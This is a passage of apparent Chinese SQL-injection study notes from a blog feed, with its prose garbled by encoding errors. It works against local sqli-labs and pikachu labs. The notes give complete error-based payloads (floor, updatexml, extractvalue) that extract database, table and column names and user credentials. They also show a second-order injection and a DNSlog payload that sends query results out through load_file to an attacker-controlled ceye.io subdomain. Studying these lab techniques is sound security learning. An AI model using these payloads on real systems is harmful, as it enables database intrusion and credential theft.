æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚æ¯”å¦‚åœ¨ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­åœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚äºŒæ¬¡æ³¨å…¥æ— æ³•é€šè¿‡æ‰«æå·¥å…·æˆ–è€…ä»£ç è‡ªå·±æ‰‹å·¥æµ‹è¯•å‡ºæ¥çš„ï¼ŒäºŒæ¬¡æ³¨å…¥ä¸€èˆ¬ä¼šäº§ç”Ÿåœ¨ç½‘ç«™ç¨‹åºæºä»£ç æ‰ä¼šå‘ç°çš„æ³¨å…¥æ¼æ´ï¼Œä»å‰ç«¯æˆ–è€…é»‘ç›’æµ‹è¯•æ˜¯çœ‹ä¸åˆ°è¿™ä¸ªæ¼æ´çš„ã€‚</p><h4 id="äº§ç”Ÿ"><a href="#äº§ç”Ÿ" class="headerlink" title="äº§ç”Ÿ"></a>äº§ç”Ÿ</h4><p>äºŒæ¬¡æ³¨å…¥ä¸€èˆ¬äº§ç”Ÿåœ¨æœ‰ç™»å½•æ³¨å†Œé¡µé¢è¿™é‡Œ</p><h4 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><p>æœ‰æ—¶å€™ç½‘é¡µä¼šé€šè¿‡é™åˆ¶è¾“å…¥é•¿åº¦æ¥é™åˆ¶æˆ‘ä»¬ï¼Œå¦‚æœæ˜¯å‰ç«¯é™åˆ¶çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å°†é™åˆ¶ä¿®æ”¹æ‰ï¼Œå¦‚æœæ˜¯åç«¯ï¼Œé‚£æ²¡åŠæ³•äº†ã€‚</p><h4 id="ä¾‹å­-1"><a href="#ä¾‹å­-1" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-24/</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªadminâ€™#çš„ç”¨æˆ·</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106908.png" alt="image-20210829193029046"></p><p>ç„¶åæˆ‘ä»¬ç™»å½•</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106031.png" alt="image-20210829193111881" style="zoom:67%;" /><p>å°†å¯†ç ä¿®æ”¹ä¸ºadminæ­¤æ—¶æ•°æ®åº“ä¸­adminçš„å¯†ç ä¸º1234</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106486.png" alt="image-20210829193204312"></p><p>å¯ä»¥çœ‹åˆ°adminçš„å¯†ç è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºadminï¼Œè¿™æ ·å°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ï¼Œæˆ‘ä»¬è¯•è¯•æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) #</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106238.png" alt="image-20210829193354479"></p><p>æ²¡æˆåŠŸï¼Œæ•°æ®åº“é™åˆ¶äº†é•¿åº¦ï¼Œè¯•è¯•å¯†ç èƒ½æ³¨å…¥ä¸ï¼Œä¹Ÿä¸èƒ½ã€‚</p><p>åŸç†å°±æ˜¯è¿™æ ·ã€‚</p><h3 id="DNSlogæ³¨å…¥"><a href="#DNSlogæ³¨å…¥" class="headerlink" title="DNSlogæ³¨å…¥"></a>DNSlogæ³¨å…¥</h3><h4 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>é¦–å…ˆéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥é…ç½®çš„åŸŸåï¼Œæ¯”å¦‚ï¼šceye.ioï¼Œç„¶åé€šè¿‡ä»£ç†å•†è®¾ç½®åŸŸå ceye.io çš„ nameserver ä¸ºè‡ªå·±çš„æœåŠ¡å™¨ Aï¼Œç„¶åå†æœåŠ¡å™¨ A ä¸Šé…ç½®å¥½ DNS Serverï¼Œè¿™æ ·ä»¥æ¥æ‰€æœ‰ ceye.io åŠå…¶å­åŸŸåçš„æŸ¥è¯¢éƒ½ä¼šåˆ° æœåŠ¡å™¨ A ä¸Šï¼Œè¿™æ—¶å°±èƒ½å¤Ÿå®æ—¶åœ°ç›‘æ§åŸŸåæŸ¥è¯¢è¯·æ±‚äº†ã€‚DNSåœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹æ—¥å¿—ï¼Œå’±ä»¬è¿™ä¸ªå°±æ˜¯è¯»å–å¤šçº§åŸŸåçš„è§£ææ—¥å¿—ï¼Œæ¥è·å–ä¿¡æ¯ã€‚ç®€å•æ¥è¯´å°±æ˜¯æŠŠä¿¡æ¯æ”¾åœ¨é«˜çº§åŸŸåä¸­ï¼Œä¼ é€’åˆ°è‡ªå·±è¿™ï¼Œç„¶åè¯»å–æ—¥å¿—ï¼Œè·å–ä¿¡æ¯</p><h4 id="UNC"><a href="#UNC" class="headerlink" title="UNC"></a>UNC</h4><p>UNCï¼ˆUniversal Naming Conventionï¼‰ï¼šé€šç”¨å‘½åè§„åˆ™ï¼Œä¹Ÿç§°é€šç”¨å‘½åè§„èŒƒã€é€šç”¨å‘½åçº¦å®šã€‚UNCä¸ºç½‘ç»œï¼ˆä¸»è¦æŒ‡å±€åŸŸç½‘ï¼‰ä¸Šèµ„æºçš„å®Œæ•´Windowsåç§°ã€‚UNCè·¯å¾„æ ¼å¼ï¼š\servername\sharenameï¼Œå…¶ä¸­servernameæ˜¯æœåŠ¡å™¨åã€‚sharenameæ˜¯å…±äº«èµ„æºçš„åç§°ã€‚ç›®å½•æˆ–æ–‡ä»¶çš„UNCåç§°å¯ä»¥åŒ…æ‹¬å…±äº«åç§°ä¸‹çš„ç›®å½•è·¯å¾„ï¼Œæ ¼å¼ä¸ºï¼š\servername\sharename\directory\filenameã€‚ç”±äºåæ–œæ çš„è½¬ä¹‰æ•ˆæœï¼Œè¯­å¥ä¸­è¾“å…¥çš„å››ä¸ªåæ–œæ  ï¼ˆ\\ï¼‰ï¼Œåœ¨è½¬ä¹‰åå¾—åˆ°ï¼ˆ\ï¼‰ã€‚å®é™…æ‰§è¡Œçš„åªæœ‰ä¸¤ä¸ªåå¼•å·ã€‚</p><h4 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h4><p>concatå‡½æ•°å°†æ‰§è¡Œç»“æœä¸è·å–åˆ°çš„åŸŸåï¼ˆXXX.ceye.io\abcï¼‰æ‹¼æ¥ï¼Œæ„æˆä¸€ä¸ªæ–°çš„åŸŸåï¼Œ load_file()å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œé‚£ä¹ˆè¿™ä¸€æ¡å¸¦æœ‰æ•°æ®åº“æŸ¥è¯¢ç»“æœçš„åŸŸåå°±è¢«æäº¤åˆ°DNSæœåŠ¡å™¨è¿›è¡Œè§£æï¼Œç„¶åæˆ‘ä»¬æŸ¥çœ‹DNSè§£æè®°å½•å°±å¯ä»¥å¾—åˆ°sqlæŸ¥è¯¢ç»“æœ</p><h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windowsï¼š load_file()</span><br><span class="line">æŸ¥çœ‹mysqlè¯»å–æƒé™ã€‚</span><br><span class="line">show variables like &#x27;%secure%&#x27;;</span><br><span class="line">secure_file_privé¡¹ä¸ºç©ºæ‰å¯ä»¥ä½¿ç”¨load_fil()å‡½æ•°ï¼Œåœ¨mysql.iniä¸­æ·»åŠ  secure_file_priv=&#x27;&#x27; </span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨åœºæ™¯"><a href="#åˆ©ç”¨åœºæ™¯" class="headerlink" title="åˆ©ç”¨åœºæ™¯"></a>åˆ©ç”¨åœºæ™¯</h4><p>åœ¨sqlæ³¨å…¥æ—¶ä¸ºå¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ï¼Œæ³¨å…¥çš„æ•ˆç‡ä½ä¸”çº¿ç¨‹é«˜å®¹æ˜“è¢«wafæ‹¦æˆªï¼Œåˆæˆ–è€…æ˜¯ç›®æ ‡ç«™ç‚¹æ²¡æœ‰å›æ˜¾ï¼Œæˆ‘ä»¬åœ¨è¯»å–æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤æ³¨å…¥ç­‰æ“ä½œæ—¶æ— æ³•æ˜æ˜¾çš„ç¡®è®¤æ˜¯å¦åˆ©ç”¨æˆåŠŸï¼Œè¿™æ—¶å€™å°±è¦ç”¨åˆ°æˆ‘ä»¬çš„DNSlogæ³¨å…¥ã€‚</p><h4 id="æ¨èå¹³å°"><a href="#æ¨èå¹³å°" class="headerlink" title="æ¨èå¹³å°"></a>æ¨èå¹³å°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/ï¼ˆéœ€è¦æ³¨å†Œï¼‰  </span><br><span class="line">http://www.dnslog.cn</span><br><span class="line">http://admin.dnslog.link</span><br></pre></td></tr></table></figure><h4 id="ä¾‹å­-2"><a href="#ä¾‹å­-2" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/?id=-1&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.nd91wz.ceye.io\\abc&#x27;))),1,0)--+ </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106508.png" alt="image-20210901142715138"></p><p><code>&quot;\\\\&quot;</code> å››ä¸ª<code>\</code>ä¸èƒ½å°‘</p><p>æ³¨æ„<code>.xxxx.ceye.io</code>æ˜¯ä½ çš„å­åŸŸåï¼Œå‰é¢è¦åŠ ä¸ª<code>.</code></p><p>åé¢çš„<code>\\xxx</code>ï¼Œ<code>\\</code>æ˜¯å¿…é¡»çš„ï¼Œ`xxxè¿™éƒ¨åˆ†éšä¾¿æ˜¯ä»€ä¹ˆå†…å®¹ï¼Œä¸èƒ½ä¸ºç©ºã€‚ </p><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><p>ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/adooo/dnslogsqlinj</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>16WEBæ¼æ´--SQLæ³¨å…¥ä¹‹æŸ¥è¯¢æ–¹å¼åŠæŠ¥é”™ç›²æ³¨</title>
      <link href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/"/>
      <url>/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å½“è¿›è¡Œ SQL æ³¨å…¥æ—¶ï¼Œæœ‰å¾ˆå¤šæ³¨å…¥ä¼šå‡ºç°æ— å›æ˜¾çš„æƒ…å†µï¼Œå…¶ä¸­ä¸å›æ˜¾çš„åŸå› å¯èƒ½æ˜¯ SQL è¯­å¥æŸ¥è¯¢æ–¹å¼çš„é—®é¢˜å¯¼è‡´ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦ç”¨åˆ°ç›¸å…³çš„æŠ¥é”™æˆ–ç›²æ³¨è¿›è¡Œåç»­æ“ä½œï¼ŒåŒæ—¶ä½œä¸ºæ‰‹å·¥æ³¨å…¥æ—¶ï¼Œæå‰äº†è§£æˆ–é¢„çŸ¥å…¶SQL è¯­å¥å¤§æ¦‚å†™æ³•ä¹Ÿèƒ½æ›´å¥½çš„é€‰æ‹©å¯¹åº”çš„æ³¨å…¥è¯­å¥ã€‚</p><h3 id="æ•°æ®åº“æ“ä½œ"><a href="#æ•°æ®åº“æ“ä½œ" class="headerlink" title="æ•°æ®åº“æ“ä½œ"></a>æ•°æ®åº“æ“ä½œ</h3><h4 id="æŸ¥"><a href="#æŸ¥" class="headerlink" title="æŸ¥"></a>æŸ¥</h4><p>åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œæ•°æ®æ˜¾ç¤ºæŸ¥è¯¢æ•ˆæœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select åˆ—åç§° æˆ– * from è¡¨åç§° where å­—æ®µ1=&#x27;æ¡ä»¶1&#x27; and å­—æ®µ2=&#x27;æ¡ä»¶2&#x27;</span><br></pre></td></tr></table></figure><h4 id="å¢"><a href="#å¢" class="headerlink" title="å¢"></a>å¢</h4><p>åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œç”¨æˆ·æ³¨å†Œæ·»åŠ ç­‰æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table name(åˆ—1,åˆ—2 ...) values(å€¼1,å€¼2)</span><br></pre></td></tr></table></figure><h4 id="æ”¹"><a href="#æ”¹" class="headerlink" title="æ”¹"></a>æ”¹</h4><p>ä¼šå‘˜æˆ–åå°ä¸­å¿ƒæ•°æ®åŒæ­¥æˆ–ç¼“å­˜ç­‰æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update è¡¨åç§° set åˆ—åç§°=æ–°å€¼ where åˆ—åç§°=æŸå€¼</span><br></pre></td></tr></table></figure><h4 id="åˆ "><a href="#åˆ " class="headerlink" title="åˆ "></a>åˆ </h4><p>åå°ç®¡ç†é‡Œé¢åˆ é™¤æ–‡ç« åˆ é™¤ç”¨æˆ·ç­‰æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from è¡¨åç§° where åˆ—åç§°=å€¼</span><br></pre></td></tr></table></figure><h4 id="order-by-æ’åºæ•°æ®"><a href="#order-by-æ’åºæ•°æ®" class="headerlink" title="order by æ’åºæ•°æ®"></a>order by æ’åºæ•°æ®</h4><p>ä¸€èˆ¬ç»“åˆè¡¨åæˆ–åˆ—åè¿›è¡Œæ•°æ®æ’åºæ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select åˆ—åç§° æˆ– * from è¡¨åç§° order by åˆ—å</span><br></pre></td></tr></table></figure><h4 id="é‡ç‚¹ç†è§£ï¼š"><a href="#é‡ç‚¹ç†è§£ï¼š" class="headerlink" title="é‡ç‚¹ç†è§£ï¼š"></a>é‡ç‚¹ç†è§£ï¼š</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸ŠæŸ¥è¯¢æ–¹å¼ä¸ç½‘ç«™åº”ç”¨çš„å…³ç³»</p><p>æ³¨å…¥ç‚¹äº§ç”Ÿåœ°æ–¹æˆ–åº”ç”¨çŒœæµ‹åˆ°å¯¹æ–¹çš„ SQL æŸ¥è¯¢æ–¹å¼</p><h3 id="SQL-æ³¨å…¥æŠ¥é”™ç›²æ³¨"><a href="#SQL-æ³¨å…¥æŠ¥é”™ç›²æ³¨" class="headerlink" title="SQL æ³¨å…¥æŠ¥é”™ç›²æ³¨"></a>SQL æ³¨å…¥æŠ¥é”™ç›²æ³¨</h3><p>ç›²æ³¨å°±æ˜¯åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œè·å–çš„æ•°æ®ä¸èƒ½å›æ˜¾è‡³å‰ç«¯é¡µé¢ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–è€…å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¹‹ä¸ºç›²æ³¨ã€‚æˆ‘ä»¬å¯ä»¥çŸ¥é“ç›²æ³¨åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»ï¼š</p><p>åŸºäºå¸ƒå°”çš„ SQL ç›²æ³¨-é€»è¾‘åˆ¤æ–­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp,like,ascii,left,ord,mid</span><br></pre></td></tr></table></figure><p>åŸºäºæ—¶é—´çš„ SQL ç›²æ³¨-å»¶æ—¶åˆ¤æ–­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if,sleep</span><br></pre></td></tr></table></figure><p>åŸºäºæŠ¥é”™çš„ SQL ç›²æ³¨-æŠ¥é”™å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">floorï¼Œupdatexmlï¼Œextractvalue</span><br></pre></td></tr></table></figure><h3 id="åŸºäºæŠ¥é”™çš„-SQL-ç›²æ³¨-æŠ¥é”™å›æ˜¾"><a href="#åŸºäºæŠ¥é”™çš„-SQL-ç›²æ³¨-æŠ¥é”™å›æ˜¾" class="headerlink" title="åŸºäºæŠ¥é”™çš„ SQL ç›²æ³¨-æŠ¥é”™å›æ˜¾"></a>åŸºäºæŠ¥é”™çš„ SQL ç›²æ³¨-æŠ¥é”™å›æ˜¾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¸¸ç”¨æŠ¥é”™æ³¨å…¥å‡½æ•°:floorï¼Œupdatexmlï¼Œextractvalue</span><br></pre></td></tr></table></figure><h4 id="flooræŠ¥é”™æ³¨å…¥ï¼ˆ64æ˜¾ç¤ºä½é™åˆ¶ï¼‰"><a href="#flooræŠ¥é”™æ³¨å…¥ï¼ˆ64æ˜¾ç¤ºä½é™åˆ¶ï¼‰" class="headerlink" title="flooræŠ¥é”™æ³¨å…¥ï¼ˆ64æ˜¾ç¤ºä½é™åˆ¶ï¼‰"></a>flooræŠ¥é”™æ³¨å…¥ï¼ˆ64æ˜¾ç¤ºä½é™åˆ¶ï¼‰</h4><p><strong>åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/zpy1998zpy/article/details/80650540</span><br><span class="line">https://www.freebuf.com/column/235496.html</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>å°è¿ªè®²çš„é‚£ä¸ªæœ‰ç‚¹éº»çƒ¦ï¼Œæˆ‘ç®€åŒ–äº†ä¸€ä¸‹</p><p>æŸ¥æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105995.png" alt="image-20210828161850724"></p><p>æŸ¥è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105180.png" alt="image-20210828163633404"></p><p>æŸ¥åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,column_name,0x7e) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105683.png" alt="image-20210828163806607"></p><p>æŸ¥æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,concat(username,0x7e,password),0x7e) from pikachu.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105450.png" alt="image-20210828164159225"></p><h4 id="updatexmlæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰"><a href="#updatexmlæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰" class="headerlink" title="updatexmlæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰"></a>updatexmlæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰</h4><p><strong>åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881140/article/details/89565706</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>æŸ¥æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p>æŸ¥è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 3,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106721.png" alt="image-20210828165528886"></p><p>æŸ¥åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106317.png" alt="image-20210828165928071"></p><p>æŸ¥æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from pikachu.users limit 0,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105013.png" alt="image-20210828170043295"></p><h4 id="extractvalueæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰"><a href="#extractvalueæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰" class="headerlink" title="extractvalueæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰"></a>extractvalueæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰</h4><p><strong>åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881140/article/details/89565706</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>æŸ¥æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1 &#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p>åé¢çš„å’Œupdatexmlå·®ä¸å¤šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯extractvalueåªæœ‰ä¿©ä¸ªå‚æ•°</p><h4 id="updateæ³¨å…¥"><a href="#updateæ³¨å…¥" class="headerlink" title="updateæ³¨å…¥"></a>updateæ³¨å…¥</h4><p>åˆšæ‰ä¸Šé¢æ˜¯é€šè¿‡insertè¿›è¡Œçš„æ³¨å…¥ï¼Œè¿™é‡Œè¯•ä¸€ä¸‹updateï¼ŒåŸç†ä¸€æ ·è¿™é‡Œå°±æŸ¥ä¸€ä¸‹æ•°æ®åº“åï¼Œå…¶ä»–çš„çœ‹ä¸Šé¢ã€‚</p><h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure><h4 id="deleteæ³¨å…¥"><a href="#deleteæ³¨å…¥" class="headerlink" title="deleteæ³¨å…¥"></a>deleteæ³¨å…¥</h4><p>GETæ–¹å¼çš„è¯ï¼Œå¦‚æœæ˜¯åœ¨burp suiteä¸­å»è¿›è¡Œæ³¨å…¥ï¼Œéœ€è¦å°†ç©ºæ ¼æ”¹ä¸ºåŠ å·æˆ–è€…%20ã€‚POSTåˆ™ä¸éœ€è¦</p><h5 id="floor-1"><a href="#floor-1" class="headerlink" title="floor"></a>floor</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 